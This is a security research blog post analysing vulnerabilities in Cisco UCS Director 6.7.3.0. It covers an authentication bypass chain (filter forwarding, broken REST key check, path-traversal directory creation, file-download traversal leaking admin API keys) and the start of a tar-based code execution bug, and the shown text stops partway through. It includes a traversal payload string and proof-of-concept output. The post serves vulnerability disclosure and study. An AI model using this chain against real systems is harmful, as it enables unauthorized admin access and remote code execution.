---
layout: post
title: "Strike Three :: Symlinking Your Way to Unauthenticated Access Against Cisco UCS Director"
date: 2020-04-17 09:00:00 -0500
categories: blog
---

![Cisco - Unified Computing System or Unauthenticated Cisco Shell](/assets/images/strike-three/logo.png "Cisco - Unified Computing System or Unauthenticated Cisco Shell")

This is the final blog post to my series of attacks against Cisco software. If you haven't seen the previous posts, I recommend you check them out [here](/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html) and [here](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html). Like always, we will start from an unauthenticated context and work our way up to full blown remote code execution as root and I will share some of the interesting discoveries along the way :-)
<!--more-->

TL;DR; *In this post, I will walk through some of the vulnerabilities I discovered in Cisco UCS Director and what makes them interesting and unique to other discoveries. If there is one thing you take away from this post, it's that the tar command executed against an untrusted file is considered harmful.*

## Testing Environment

In the interest of reproducibility, here are the details of the software I tested.

- Name: Cisco UCS Director 6.7.3.0 VMWARE Evaluation
- File: CUCSD_6_7_3_0_67414_VMWARE_SIGNED_EVAL.zip
- Version: 6.7.3.0 VMWARE Evaluation (latest at the time)
- MD5: 3f79463a654c91dbf4b620884e2a3b21
- Size: 4355.99 MB (4567591797 bytes)
- Download: https://software.cisco.com/download/home/286320555/type/285018084/release/6

## Authentication Bypass

Typically speaking, in a web app the majority of an attack surface is exposed to authenticated users. Therefore, in order to expose this surface, one needs an authentication bypass of some sort. This is always the hardest part of the auditing process and quite often an attacker has to get creative and either find a single flaw or a series of subtle mistakes that can lead to a complete authentication bypass, ideally without a social engineering context.

In this example, we are in the latter position and I will break down the small mistakes that lead to the leak of the admins rest API key and subsequent session creation with high privileges. Below is the list of vulnerabilities that allowed for a complete authentication bypass!

1. RESTUrlRewrite RequestDispatcher.forward Filter Bypass
2. RestAPI isEnableRestKeyAccessCheckForUser Flawed Logic
3. RestAPI$MyCallable call Arbitrary Directory Creation
4. RestAPI downloadFile Directory Traversal Information Disclosure

###  1. RESTUrlRewrite RequestDispatcher.forward Filter Bypass

Looking inside of `/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/WEB-INF/web.xml` we can see the following entries:

```xml
  <servlet>
    <servlet-name>RestAPIServlet</servlet-name>
    <servlet-class>com.cloupia.client.web.RestAPI</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>RestAPIServlet</servlet-name>
    <url-pattern>/api/rest</url-pattern>
  </servlet-mapping>

  <servlet>
    <servlet-name>mo</servlet-name>
    <servlet-class>com.cloupia.client.web.MoServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>mo</servlet-name>
    <url-pattern>/api-v2/*</url-pattern>
  </servlet-mapping>
```

These are essentially protected by the `RestAuth` filter.

```xml
    <filter-name>RestAuth</filter-name>
    <url-pattern>/api/*</url-pattern>
  </filter-mapping>
  <filter-mapping>
    <filter-name>RestAuth</filter-name>
    <url-pattern>/api-v2/*</url-pattern>
  </filter-mapping>
```

Upon inspection of the `RestAuth` filter, there doesn't seem to be a way to bypass this filter after [CVE-2019-1937](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby). However, it maybe possible to find a forwarding servlet/filter that we can reach unauthenticated that will reach the API for us. As it turns out, in another web application that was exposed, there is.

Forwarding filters/servlets are interesting because they allow a attacker to bypass any remaining filters to the target servlet. Let's try to understand this with a real example. Inside of the `/opt/infra/web_cloudmgr/apache-tomcat/webapps/cloupia/WEB-INF/web.xml` file we see:

```xml
    <filter-mapping>
        <filter-name>RESTUrlRewrite</filter-name>
        <url-pattern>/api/*</url-pattern>
        <url-pattern>/api-v2/*</url-pattern>        
    </filter-mapping>
  
   <filter> 
    <filter-name>RESTUrlRewrite</filter-name>
    <filter-class>
        com.cloupia.client.web.auth.urlfilter.RESTUrlRewriteFilter
    </filter-class>
  </filter>
```

If we access that uri pattern from the cloupia application, then we will hit the `RESTUrlRewriteFilter` filter. Let's see the code inside of that filter:

```java
/*    */   public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
/* 38 */     HttpServletRequest request = (HttpServletRequest)req;
/* 39 */     String requestURI = request.getRequestURI();                                           // 1
/* 40 */     String method = request.getMethod();
/*    */     
/* 42 */     ServletContext context = getFilterConfig().getServletContext().getContext("/app");
/*    */
/*    */      // ...
/*    */
/* 54 */     if (requestURI.startsWith("/cloupia/")) {                                             // 2
/* 55 */       String newURI = requestURI.replace("/cloupia/", "/");                               // 3
/*    */ 
/*    */      // ...
/*    */ 
/*    */       try {
/* 60 */         RequestDispatcher dispatcher = context.getRequestDispatcher(newURI);
/*    */ 
/*    */      // ...
/*    */
/* 64 */         dispatcher.forward(request, res);                                                 // 4
```

At *[1]* the code gets the attackers supplied URI request and at *[2]* the code checks to see if it starts with "cloupia", if it does, it replaces it with "/" and stores it into `newURI` at *[3]* . Finally at *[4]* the code calls `RequestDispatcher.forward` to forward the request. This allows an attacker to side step the `RestAuth` filter and reach the `RestAPI` class.

### 2. RestAPI isEnableRestKeyAccessCheckForUser authentication bypass

Inside of the `com.cloupia.client.web.RestAPI` class we can find the following code:

```java
/*      */ public class RestAPI
/*      */   extends HttpServlet
/*      */ {
/*      */   private static final long serialVersionUID = 7975946862395704005L;
/*      */   private static final String SERVICE_NAME = "InfraMgr";
/*      */   private static final String GET_REST_API_KEY = "getRESTKey";
/*   63 */   public static String KEY_HEADER_NAME = "X-Cloupia-Request-Key";
/*      */   public static final String INVALID_USER = "*** Invalid User ***";
/*   65 */   public static final Logger logger = Logger.getLogger(RestAPI.class);
/*      */ 
/*      */   
/*      */   public static final String IS_USER_REST_REQUEST_LIMIT_EXCEEDED = "IsRESTRequestLimitExceededForUser";

/*   71 */   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); }

/*   81 */   protected void doDelete(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); }

/*   91 */   protected void doPut(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); }
```

Any PUT/GET/DELETE request made by an attacker will land in the `doPost` method below.

```java
/*      */   public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
/*   98 */     userNameInSession = null;
/*      */     
/*      */     try {
/*  101 */       String userName = null;
/*  102 */       if (request.getParameter("username") != null) {
/*  103 */         userName = request.getParameter("username");
/*      */       }
/*  105 */       if (request.getParameter("user") != null) {
/*  106 */         userName = request.getParameter("user");
/*      */       }
/*  108 */       String password = null;
/*  109 */       if (request.getParameter("password") != null) {
/*  110 */         password = request.getParameter("password");
/*      */       }
/*  112 */       ProductAccess userBean = null;
/*  113 */       if (request.getSession() != null && request.getSession().getAttribute("USER_IN_SESSION") != null) {
/*      */         
/*  115 */         userBean = (ProductAccess)request.getSession().getAttribute("USER_IN_SESSION");
/*  116 */         userNameInSession = userBean.getLoginName();
/*      */       } 
/*  118 */       logger.debug("user name in Session is ..." + userNameInSession);
/*  119 */       if (userName != null && password != null) {
/*  120 */         boolean validUser = isValidUser(userName, password);
/*  121 */         if (!validUser) {
/*  122 */           response.sendError(401, "username/password wrong for rest api access");
/*      */           
/*      */           return;
/*      */         } 
/*      */       } 
/*      */       
/*  128 */       String opName = request.getParameter("opName");
/*      */ 
/*      */ 
/*      */       
/*  132 */       if (!isOperationAllowed(opName)) {
/*      */         
/*  134 */         if (userNameInSession != null) {
/*  135 */           UserRequestManager.getInstance().removeRestRequest(userNameInSession);
/*      */         }
/*      */         
/*  138 */         response.sendError(400, "Invalid operation name");
/*      */         return;
/*      */       } 
/*  141 */       if (opName.equals("getRESTKey")) {
/*      */         
/*  143 */         getRestKey(request, response);
/*      */       } else {
/*      */         
/*  146 */         logger.info("RestAPI opName:" + opName);
/*      */ 
/*      */         
/*  149 */         response.setHeader("Cache-Control", "max-age=0,must-revalidate");
/*      */ 
/*      */ 
/*      */         
/*  153 */         response.setHeader("Expires", "-1");
/*      */ 
/*      */ 
/*      */         
/*      */         try {
/*  158 */           executeGenericOp(request, response);                  // 1
/*  159 */         } catch (Exception e) {
/*      */           
/*  161 */           logger.error("executeGenericOp failed");
/*  162 */           e.printStackTrace();
/*      */         }
/*      */       
/*      */       } 
/*      */     }
```

It's possible for a remote attacker to reach *[1]*, which is a call to `executeGenericOp` using the attacker supplied request.

```java
/*      */   private void executeGenericOp(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
/*  206 */     String formatType = request.getParameter("formatType");
/*  207 */     boolean isXML = false;
/*      */     
/*  209 */     if (formatType != null && formatType.equalsIgnoreCase("xml"))
/*      */     {
/*  211 */       isXML = true;
/*      */     }
/*      */     
/*  214 */     String serviceName = "InfraMgr";
/*  215 */     String opName = request.getParameter("opName");                                  // 2
/*  216 */     String opData = request.getParameter("opData");                                  // 3
/*  217 */     logger.info("executeGenericOp - serviceName:" + serviceName + ", opName:" + opName + ", opData:" + opData);
/*      */     
/*  219 */     if (isXML != true) {
/*      */       try {
/*  221 */         JSON.getJsonElement(opData, "");
/*      */       }
/*  223 */       catch (Exception e) {
/*  224 */         sendResponseError(response, "Malformed data in the parameter opData", serviceName, opName, isXML);
/*      */       } 
/*      */     }
/*      */ 
/*      */     // ...
/*      */ 
/*  252 */     ServiceIf sif = null;
/*      */ 
/*      */     
/*      */     try {
/*  256 */       sif = ServiceClient.getInstance().lookupService(serviceName);
/*      */       
/*  258 */       if (sif == null) {
/*      */         
/*  260 */         sendResponseError(response, "SERVICE_LOOKUP_FAIL", serviceName, opName, isXML);
/*      */         
/*      */         return;
/*      */       } 
/*  264 */     } catch (Exception ex) {
/*      */       
/*  266 */       sendResponseError(response, "SERVICE_LOOKUP_EXCEPTION: " + ex.getMessage(), serviceName, opName, isXML);
/*  267 */       throw new Exception("SERVICE_LOOKUP_FAILED");
/*      */     } 
/*      */     
/*  270 */     UserSession userSession = getUserSessionInfo(request);
/*  271 */     String restKey = request.getHeader(KEY_HEADER_NAME);                             // 4
/*  272 */     boolean isRestAPIAccessEnabledUser = true;
/*  273 */     if (restKey == null) {                                                           // 5
/*      */       
/*  275 */       isRestAPIAccessEnabledUser = AuthenticationManager.getInstance().authenticatedUserRestKeyAccess(userSession.getUserId());
/*      */     
/*      */     }
/*  278 */     else if (opName.startsWith("userAPI") || opName.contains(":userAPI")) {          // 6
/*  279 */       isRestAPIAccessEnabledUser = isEnableRestKeyAccessCheckForUser(request);       // 7
/*      */     } 
```

At *[2]* and *[3]* the code sets the `opName` and `opData` variables from attacker supplied data in the request. Then at *[4]* we make sure that our request contains the header "X-Cloupia-Request-Key". This is to ensure we don't land at *[5]* and continue to *[6]* where `opName` needs to start with "userAPI" or contain ":userAPI".

If it does, then we can reach *[7]* which is a call to `isEnableRestKeyAccessCheckForUser`. **Upon failure of a rest key check, this method should return false.**

```java
/*      */   public static boolean isEnableRestKeyAccessCheckForUser(HttpServletRequest request) {
/*  793 */     boolean keyMatch = false;
/*  794 */     boolean isEnabledRestKeyAccess = false;
/*  795 */     String restKey = request.getHeader(KEY_HEADER_NAME);                             // 8
/*      */     
/*  797 */     AuthenticationManager authManager = AuthenticationManager.getInstance();
/*      */     
/*  799 */     if (restKey != null && !restKey.equals("")) {                                    // 9
/*  800 */       ProductAccess keyUser = authManager.getKeyUser(restKey);
/*  801 */       logger.info("trying authorization with restKey");
/*      */       
/*  803 */       if (keyUser != null && keyUser.getRestKey() != null) {                         // 10
/*  804 */         if (keyUser.getRestKey().equals(restKey)) {
/*  805 */           logger.info("allowing rest api call (key match)");
/*  806 */           keyMatch = true;
/*      */         } else {
/*      */           
/*  809 */           logger.info("user " + keyUser.getLoginName() + " key does not match with rest key " + restKey);
/*      */         } 
/*      */       } else {                                                                       // 11
/*  812 */         logger.info("no user found with rest key " + restKey);
/*      */       } 
/*  814 */       if (keyMatch) {                                                                // 12
/*      */         
/*      */         try {
/*      */ 
/*      */           
/*  819 */           isEnabledRestKeyAccess = authManager.authenticatedUserRestKeyAccess(keyUser.getLoginName());
/*  820 */           if (!isEnabledRestKeyAccess) {
/*  821 */             return false;
/*      */           }
/*  823 */         } catch (Exception e) {
/*  824 */           logger.error("REST KEY Access Check service encountered an error" + e);
/*      */           
/*  826 */           return false;
/*      */         } 
/*      */       }
/*      */     } 
/*  830 */     return true;                                                                     // 13
/*      */   }
```

At *[8]* the code gets the `restKey` from the request header "X-Cloupia-Request-Key" and at *[9]* there is a check to see if the value is NULL or an empty string. Assuming it's not (but it could be) we land into the else at *[11]* because at *[10]* the check will fail since `keyUser` will be NULL.

Then at *[12]* there is a check to see if `keyMatch` is set to true, which it isn't because we didn't have a matching key. Since we don't land into the block at *[12]* we circumvent further checks and at *[13]* we return true!

Continuing on through the `executeGenericOp` method:

```java
*  283 */     if (!isRestAPIAccessEnabledUser) {                    // 14
/*  284 */       sendResponseError(response, "REMOTE_SERVICE_EXCEPTION: Permission denied to perform the REST API operation.", serviceName, opName, isXML);
/*      */       
/*      */       return;
/*      */     } 
/*  288 */     String apiName = "";
/*      */     
/*  290 */     if (opName.contains(":"))                            // 15
/*  291 */       apiName = opName.split(":")[1]; 
/*  292 */     if ("userAPIDownloadFile".equals(apiName)) {         // 16
/*  293 */       downloadFile(opData, response);                    // 17
/*      */       return;
/*      */     } 
```

At *[14]* we can bypass the check because `isRestAPIAccessEnabledUser` is set to true from the return value of `isEnableRestKeyAccessCheckForUser`. Then at *[15]* the code extracts the `apiName` from the attacker supplied `opName`. At *[16]* the code checks to see if the `apiName` is set to "userAPIDownloadFile" and if so, calls `downloadFile` at *[17]*.

### 3. RestAPI$MyCallable call Arbitrary Directory Creation

Before we can download a valid file though, the path needs to exist on the filesystem. By default, the `/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports` directory doesn't exist.

So we need to find an API that allows for path creation, this is quite common in targets and I found one in the `RestAPI$MyCallable` `call` method. *Side note for those wondering: The $ character in the class means that the `MyCallable` class is an inline class inside of the `RestAPI` class.*

Inside of the `executeGenericOp` method of the `RestAPI` class, we can see:

```java
/*  310 */     if ("userAPIUnifiedImport".equals(apiName)) {
/*  311 */       MyCallable callable = initialiseFileUplod(request);                                    // 1
/*  312 */       FileUploadInfo fileInfo = callable.getFileInfo();
/*  313 */       String errorMsg = FileUploadUtil.validateFileUpload(fileInfo, request, response);
/*  314 */       if (!"".equals(errorMsg)) {
/*  315 */         sendResponseError(response, errorMsg, "InfraMgr", opName, false);
/*      */         return;
/*      */       } 
/*  318 */       userApiUpload(fileInfo, callable);                                                     // 2
```

This code will call `initialiseFileUplod` and will return a `MyCallable` instance at *[1]*. *Side note: Misspelt functions names are a sure fire sign of poor security!*

```java
/*      */   public MyCallable initialiseFileUplod(HttpServletRequest request) {
/*  464 */     String opData = request.getParameter("opData");
/*      */     
/*  466 */     File tempDirLocation = new File("/opt/infra/uploads/multipart/1_" + (new Date()).getTime());
/*  467 */     boolean isTempDirCreated = false;
/*  468 */     if (!tempDirLocation.exists()) {
/*  469 */       isTempDirCreated = tempDirLocation.mkdirs();
/*      */     }
/*  471 */     logger.info("Is tempDir got created:" + isTempDirCreated);
/*  472 */     FileUploadUtil.setPermissions(tempDirLocation.getAbsolutePath());
/*  473 */     FileUploadUtil.providePermissionToFile(tempDirLocation.getAbsolutePath());
/*  474 */     return new MyCallable(request, tempDirLocation, opData);
/*      */   }
```

Then at *[2]* the callable will be parsed to `userApiUpload`.

```java
/*      */   private void userApiUpload(FileUploadInfo fileInfo, MyCallable callable) {
/*  479 */     logger.debug("userApiUpload getting called");
/*  480 */     FileUploadUtil.handlePersistenceBasedOnUploadPolicy(fileInfo);
/*      */     
/*  482 */     FutureTask<FileUploadInfo> futureTask = new FutureTask<FileUploadInfo>(callable);
/*  483 */     Thread t = new Thread(futureTask);
/*  484 */     t.start();                                                                               // 3
/*      */   }
```

This code will start a new threaded task at *[3]* and triggers the `call` method inside of the `MyCallable` class.

```java
/*      */     public FileUploadInfo call() {
/*  909 */       RestAPI.logger.debug("Control inside the call method...");
/*      */       
/*  911 */       String fileName = this.fileInfo.getFileName();                                         // 4
/*      */ 
/*      */ 
/*      */ 
/*      */       
/*  916 */       byte[] totalByteArray = new byte[0];
/*      */       
/*      */       try {
/*  919 */         Iterator<FileItem> fileIterator = this.fileItems.iterator();
/*  920 */         while (fileIterator.hasNext()) {
/*  921 */           FileItem fi = (FileItem)fileIterator.next();
/*  922 */           if (!fi.isFormField())
/*      */           {
/*      */ 
/*      */             
/*  926 */             String contentType = fi.getContentType();
/*      */             
/*  928 */             long sizeInBytes = fi.getSize();
/*  929 */             RestAPI.logger.info("Uploaded Filename: " + fileName + ":contentType:" + contentType + "]]sizeInBytes:" + sizeInBytes);
/*      */             
/*  931 */             if (sizeInBytes <= this.sizeThreshold) {
/*  932 */               byte[] individualByteArray = fi.get();
/*  933 */               totalByteArray = FileUploadUtil.concatenateByteArrays(totalByteArray, individualByteArray);
/*      */             }
/*      */           
/*      */           }
/*      */         
/*      */         }
/*      */       
/*  940 */       } catch (Exception ex) {
/*  941 */         RestAPI.logger.error("While iterting fileItems>>>" + ex);
/*      */         
/*  943 */         FileUploadUtil.setFailureReason(this.fileInfo, ex);
/*      */       } 
/*      */ 
/*      */ 
/*      */       
/*  948 */       String uploadedFilePath = "/opt/infra/uploads/ApiUploads/" + fileName;             // 5
/*  949 */       File myfile = new File(uploadedFilePath);                                          // 6
/*  950 */       myfile.getParentFile().mkdirs();                                                   // 7
```

The `fileInfo` field is set with attacker controlled values from the request from the previous call to `getFileInfo` in the `executeGenericOp` method. At *[4]* we can see the `fileName` is attacker supplied and later at *[5]* the code builds a string with the supplied filename from the upload request.

At *[6]* a new file instance is created and finally at *[7]* the `getParentFile` method is called which will return the directory structure supplied by the attacker. Finally at *[7]* the `mkdirs` method is called to create the attacker supplied directory structure. In my poc, I supplied the "../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/junk" string because `getParentFile` will return "../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/"

Finally, the `mkdirs` method will be triggered on the "/opt/infra/uploads/ApiUploads/../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" string.

### 4. RestAPI downloadFile Directory Traversal Information Disclosure

Now that our exports directory is created, let's disclose the `downloadFile` method from the `RestAPI` class:

```java
/*      */   private void downloadFile(String opData, HttpServletResponse response) {
/*  398 */     out = null;
/*  399 */     stream = null;
/*      */     
/*  401 */     String fileName = FileUploadUtil.getFileNameFromOpData(opData);                                      // 1
/*  402 */     String errMsg = FileUploadUtil.validateFileDownload(fileName);                                       // 2
/*  403 */     if (errMsg != null && !errMsg.isEmpty()) {
/*  404 */       sendResponseError(response, errMsg, "userAPIDownloadFile", "InfraMgr", false);
/*      */     }
/*      */     
/*  407 */     String filePath = "/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" + fileName;  // 3
/*      */     
/*      */     try {
/*  410 */       out = response.getOutputStream();
/*  411 */       stream = new FileInputStream(filePath);                                                            // 4
/*      */       
/*  413 */       response.setContentType("application/x-download");
/*  414 */       response.setHeader("Content-Disposition", "attachment; filename=" + fileName);
/*      */       
/*  416 */       logger.debug("started writing data for download...");
/*      */       
/*  418 */       data = new byte[8192];
/*  419 */       int n = 0;
/*      */       
/*  421 */       while ((n = stream.read(data)) > 0)
/*      */       {
/*  423 */         out.write(data, 0, n);                                                                           // 5
/*      */       }
/*      */       
/*  426 */       logger.debug("Done with writing data for download...");
/*      */     }
/*  428 */     catch (Exception e) {
/*      */       
/*  430 */       logger.error("While downloading file:::" + e.getMessage());
/*      */     } finally {
/*      */ 
/*      */       
/*      */       try {
/*      */         
/*  436 */         out.close();
/*  437 */         stream.close();
/*  438 */       } catch (IOException e) {
/*      */         
/*  440 */         logger.error("While closing resources::" + e.getMessage());
/*      */       } 
/*      */     } 
/*      */   }
```

At *[1]* the code calls `getFileNameFromOpData` which literally extracts the filename from the attacker supplied json object in `opData`.

```java
/*     */   public static String getFileNameFromOpData(String opData) {
/* 372 */     String fileName = null;
/*     */     try {
/* 374 */       fileName = JSON.getJsonElement(opData, "param0").toString();
/* 375 */     } catch (Exception e) {
/* 376 */       logger.error("While parsing the json string :'" + opData + "' exception occured[" + e.getMessage());
/*     */     } 
/*     */     
/* 379 */     if (fileName.charAt(0) == '"' && fileName.charAt(fileName.length() - 1) == '"') {
/* 380 */       fileName = fileName.substring(1, fileName.length() - 1).trim();
/*     */     }
/* 382 */     logger.info("File to be downloaded:" + fileName);
/* 383 */     return fileName;
/*     */   }
```

Then at *[2]* the code calls `validateFileDownload` on the attacker supplied filename.

```java
/*     */   public static String validateFileDownload(String fileName) {
/* 387 */     logger.debug("Inside the file download validation method:" + fileName);
/* 388 */     errMsg = "";
/* 389 */     if (fileName == null || fileName.isEmpty()) {
/* 390 */       return "Filename can't be null or empty.";
/*     */     }
/*     */ 
/*     */     
/* 394 */     boolean isFileExist = false;
/*     */     try {
/* 396 */       isFileExist = FileManagementUtil.isFileExist("/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" + fileName);
/* 397 */     } catch (Exception e) {
/* 398 */       logger.error("Something wrong happened while checking file existence:" + e.getMessage());
/*     */     } 
/* 400 */     if (!isFileExist) {
/* 401 */       errMsg = "There is no file with the name '" + fileName + "' for download.";
/*     */     }
/* 403 */     File file = new File("/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" + fileName);
/*     */ 
/*     */     
/* 406 */     if (file.length() > 41943040L) {
/* 407 */       errMsg = "File with size greater than 40 MB can't be downloaded.";
/*     */     }
/* 409 */     return errMsg;
/*     */   }
```

Basically, this function just checks that the file exists and will resolve a path with traversals in it. But remember, the exports directory needs to exist for us to return an empty value for `errMsg`.

Finally, at *[3]*, *[4]* and *[5]* the attacker supplied path to the filename is concatenated with "/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" and read into the `stream` variable. The contents of the `stream` variable (thus the attacker supplied file) is written to the output stream of the request.

### Exploitation

Using this ability to leak a file unauthenticated, an attacker can leak the `/opt/infra/idaccessmgr/logfile.txt` which contains API keys of admin users that have previously logged into the application.

Since this file can be large, I created a method to leak the contents of that file using chunked transfer encoding as described in [RFC 7230](https://tools.ietf.org/html/rfc7230) so it will significantly speed up the API key leak. Once the key is leaked, it's possible to hit the /api-v2/ endpoint with the supplied API key in the header and the application will generate an authenticated session of that users API key!

```bash
saturn:~ mr_me$ ./poc.py 192.168.100.144
(+) created the exports directory!
(+) found an admins rest API key: 0A7DB7EC61204627BB833CE07AEA0F4C
(+) you are now admin with: JSESSIONID=6728B95915E362BEE745C47DC6CC2FAC375204FB1C9D1431050590DCEDE0D8A2
```

## Remote Code Execution

Since I have the habit of finding multiple remote code execution vulnerabilities after authentication, I am only going to describe the most interesting one I found.

### CopyFileRunnable run Arbitrary Symlink Creation

The `com.cloupia.feature.userTemplates.ApplianceFileUploadEntryFormPage` class contains the vulnerable code reachable from `validatePageData`:

```java
/*     */ public class ApplianceFileUploadEntryFormPage
/*     */   implements PageIf
/*     */ {
/*     */
/*     */   // ...
/*     */
/*     */   public int validatePageData(Page page, ReportContext context, WizardSession session) throws Exception {
/*  87 */     logger.info("validatePageData started");
/*  88 */     session.getSessionAttributes().remove(WizardSession.CUSTOM_SESSION_TIMEOUT);
/*  89 */     page.unmarshallToSession("ID_FILE_UPLOAD_ENTRY");
/*     */     
/*  91 */     ApplianceFileUploadEntry config = (ApplianceFileUploadEntry)session.getSessionAttributes().get("ID_FILE_UPLOAD_ENTRY");
/*     */ 
/*     */     
/*  94 */     String actualFileName = config.getActualFileName();
/*  95 */     String dir = FileManagementUtil.getFullPathForLargeFileUpload(actualFileName);
/*  96 */     logger.info("Actual file name:" + actualFileName);
/*     */     
/*  98 */     boolean hasError = false;
/*  99 */     String errorMsg = null;
/*     */     
/* 101 */     if (actualFileName == null || actualFileName.length() == 0) {
/*     */       
/* 103 */       hasError = true;
/* 104 */       errorMsg = "No file uploaded";
/*     */     } 
/* 106 */     logger.debug("Error : " + errorMsg);
/* 107 */     if (!hasError) {
/*     */       
/* 109 */       String uploadFile = dir + actualFileName;
/* 110 */       File f = new File(uploadFile);
/*     */       
/* 112 */       if (!f.exists() || f.isFile());
/*     */     } 
/*     */ 
/*     */ 
/*     */     
/* 117 */     String tempPath = dir + File.separator + actualFileName;
/* 118 */     logger.info("tempPath:" + tempPath);
/*     */     
/* 120 */     String folderName = "public";
/*     */     
/* 122 */     if (config.getFolderType() == 2) {
/*     */       
/* 124 */       folderName = session.getUserId();
/* 125 */     } else if (config.getFolderType() == 3) {
/*     */       
/* 127 */       if (session.getGroup() != null) {
/*     */         
/* 129 */         folderName = session.getGroup().getGroupName();
/*     */       }
/*     */       else {
/*     */         
/* 133 */         folderName = session.getUserId();
/*     */       } 
/*     */     } 
/*     */     
/* 137 */     folderName = folderName + File.separator + System.currentTimeMillis();
/*     */     
/* 139 */     String fullPath = "/opt/infra/uploads/external/" + folderName + File.separator + actualFileName;
/*     */     
/* 141 */     if (page.isPageSubmitted()) {
/*     */ 
/*     */       
/*     */       try {
/* 145 */         UserSession usersession = UserSessionUtil.getCurrentUserSession();
/* 146 */         usersession.retrieveProfileAndAccess();
/*     */         
/* 148 */         int groupId = -1;
/*     */         
/* 150 */         if (usersession.getLoginProfile() != null && usersession.getLoginProfile().hasGroup() && (config
/* 151 */           .getFolderType() == 3 || config
/* 152 */           .getFolderType() == 2))
/*     */         {
/* 154 */           groupId = Integer.parseInt(usersession.getLoginProfile().getCustomerId());
/*     */         }
/*     */         
/* 157 */         String userId = usersession.getUserId();
/* 158 */         config.setUserId(userId);
/* 159 */         config.setGroupId(groupId);
/* 160 */       } catch (Exception e) {
/*     */         
/* 162 */         logger.error(e);
/*     */       } 
/*     */       
/* 165 */       String destFolderPath = "/opt/infra/uploads/external/" + folderName + File.separator;
/*     */       
/* 167 */       String jobStatus = (String)page.getSession().getSessionAttributes().get("COPY_FILE_STATUS");
/*     */       
/* 169 */       if (!ApplianceStorageUtil.isZipFile(tempPath) && !ApplianceStorageUtil.isOVAFile(tempPath) && null == jobStatus) {
/*     */         
/* 171 */         ApplianceStorageUtil.deleteApplianceFile(tempPath);
/* 172 */         page.setPageMessage("For OVF uploads zip/jar/ova formats are supported");
/* 173 */         page.setStatusMessageType(1);
/* 174 */         return 2;
/*     */       } 
/*     */       
/* 177 */       String zipFolder = "";
/*     */       
/* 179 */       if (!ApplianceStorageUtil.isZipFile(tempPath))
/*     */       {
/* 181 */         zipFolder = getZipFolderName(tempPath);
/*     */       }
/*     */ 
/*     */       
/* 185 */       if (null == jobStatus && (ApplianceStorageUtil.isZipFile(tempPath) || ApplianceStorageUtil.isOVAFile(tempPath))) {
/*     */         
/* 187 */         CopyFileRunnable copyFile = new CopyFileRunnable(page.getSession().getUserId(), page.getCurrentReportContext(), page.getSession(), page, tempPath, destFolderPath, fullPath, zipFolder, actualFileName, folderName);    // 1
/* 188 */         Thread t = new Thread(copyFile);
/* 189 */         t.start();                                    // 2
```

At *[1]* the code creates a new instance of the `CopyFileRunnable` class with attacker controlled `tempPath` and `actualFileName`. The `tempPath` variable contains a path to an uploaded zip file (ab)using the `LargeFileUploadServlet`. This is a jailed path, so this servlet is not vulnerable to any attacks on its own.

Let's take a look at the `run` method of the `CopyFileRunnable` class. This is triggered at *[2]* when the `start` method is called because the `CopyFileRunnable` class implements `Runnable`.

```java
/*     */   class CopyFileRunnable
/*     */     implements Runnable
/*     */   {
/*     */     ReportContext context;
/*     */     String user;
/*     */     WizardSession session;
/*     */     Page page;
/*     */     String tempPath;
/*     */     String destFolderPath;
/*     */     String fullPath;
/*     */     String zipFolder;
/*     */     String actualFileName;
/*     */     String folderName;
/*     */     
/*     */     CopyFileRunnable(String user, ReportContext context, WizardSession session, Page page, String tempPath, String destFolderPath, String fullPath, String zipFolder, String actualFileName, String folderName) {
/* 327 */       this.user = user;
/* 328 */       this.context = context;
/* 329 */       this.page = page;
/* 330 */       this.session = session;
/* 331 */       this.tempPath = tempPath;
/* 332 */       this.destFolderPath = destFolderPath;
/* 333 */       this.fullPath = fullPath;
/* 334 */       this.zipFolder = zipFolder;
/* 335 */       this.actualFileName = actualFileName;
/* 336 */       this.folderName = folderName;
/*     */     }
/*     */ 
/*     */ 
/*     */     
/*     */     public void run() {
/*     */       try {
/* 343 */         this.zipFolder = ApplianceFileUploadEntryFormPage.getZipFolderName(this.tempPath);
/* 344 */         this.session.getSessionAttributes().put("COPY_FILE_STATUS", "started");
/* 345 */         this.session.getSessionAttributes().put("ZIP_FOLDER", this.zipFolder);
/* 346 */         this.session.getSessionAttributes().put("DEST_FOLDER_PATH", this.destFolderPath);
/* 347 */         this.session.getSessionAttributes().put("TEMP_PATH", this.tempPath);
/* 348 */         this.session.getSessionAttributes().put("FULL_PATH", this.fullPath);
/* 349 */         this.session.getSessionAttributes().put("ACTUAL_FILE_NAME", this.actualFileName);
/* 350 */         this.session.getSessionAttributes().put("FOLDER_NAME", this.folderName);
/* 351 */         ApplianceStorageUtil.copyFile(this.tempPath, this.destFolderPath, this.fullPath);
/*     */         
/* 353 */         ApplianceFileUploadEntryFormPage.logger.info("zip folder name  :" + this.zipFolder);
/*     */         
/* 355 */         FileManagementUtil.cleanupDirectory(this.session);
/*     */         
/* 357 */         if (ApplianceStorageUtil.isOVAFile(this.tempPath)) {                                                          // 3
/*     */           
/* 359 */           String[] cmdSet = { "/bin/tar", "-xvf", this.actualFileName };                                              // 4
/* 360 */           ProcessExecutor.ProcessOutput po = ProcessExecutor.execute(cmdSet, new File(this.destFolderPath), 180L);    // 5
